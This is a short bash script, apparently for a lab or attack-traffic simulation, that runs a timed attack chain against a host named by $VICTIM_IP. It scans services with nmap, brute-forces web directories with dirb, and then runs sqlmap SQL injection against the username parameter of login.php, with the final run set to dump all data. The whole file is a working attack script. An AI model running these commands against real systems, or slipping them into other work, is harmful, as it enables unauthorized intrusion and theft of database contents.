#!/bin/bash

sleep 137s
nmap -sV $VICTIM_IP

sleep 113s
dirb http://$VICTIM_IP ./big.txt -X .html,.php -S -r

sleep 45s
echo -e "n\n" | sqlmap -u "http://$VICTIM_IP/login.php?username=adsf&password=adsf" -p "username" 

sleep 28s
sqlmap -u "http://$VICTIM_IP/login.php?username=adsf&password=adsf" -p "username" -a
